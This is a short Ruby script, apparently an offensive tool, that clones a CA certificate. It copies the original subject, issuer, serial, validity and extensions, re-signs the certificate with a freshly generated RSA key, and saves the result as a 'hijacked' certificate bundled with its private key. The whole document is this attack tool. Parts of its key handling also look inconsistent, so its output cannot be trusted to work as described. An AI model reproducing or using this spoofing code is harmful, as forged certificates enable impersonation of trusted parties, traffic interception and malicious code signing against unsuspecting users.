require 'rubygems'
require 'openssl'
require 'digest/md5'

key = OpenSSL::PKey::RSA.new(2048)
puts "Spoof must be in PEM format and saved as ca.pem"
raw = File.read "ca.pem"
ca_cert = OpenSSL::X509::Certificate.new raw
ca_cert.version = 2

ef = OpenSSL::X509::ExtensionFactory.new
ef.issuer_certificate = ca_cert
ef.subject_certificate = ca_cert

ca_cert.subject = ca_cert.subject
ca_cert.issuer = ca_cert.issuer
ca_cert.serial = ca_cert.serial
ca_cert.public_key = ca_cert.public_key
ca_cert.not_after = ca_cert.not_after
ca_cert.not_before = ca_cert.not_before
ca_cert.extensions = ca_cert.extensions

a = File.open("root"".key", "w")
a.syswrite("#{ca_cert.public_key}")
a.syswrite("#{key.to_pem}")

spoof = OpenSSL::PKey::RSA.new File.read 'root.key'
printf "Verifying Keys Work: "
puts spoof.private?
puts "============================================================="
root = ef.issuer_certificate.sign(spoof, OpenSSL::Digest::SHA1.new)

filer = File.open("#{ca_cert.serial}"".key", "w")
filer.syswrite("#{spoof.to_pem}")
file = File.open("spoof"".cer", "w")
file.syswrite("#{ca_cert.to_der}")
files = File.open("#{ca_cert.serial}"".pem", "w")
files.syswrite("#{ca_cert.to_pem}")
files.syswrite("#{spoof.to_pem}")

puts "Hijacked Certificate with chainloaded key saved  @ #{ca_cert.serial}.pem"
printf "Verifying Keys Intergity: "
puts  root.verify(key)
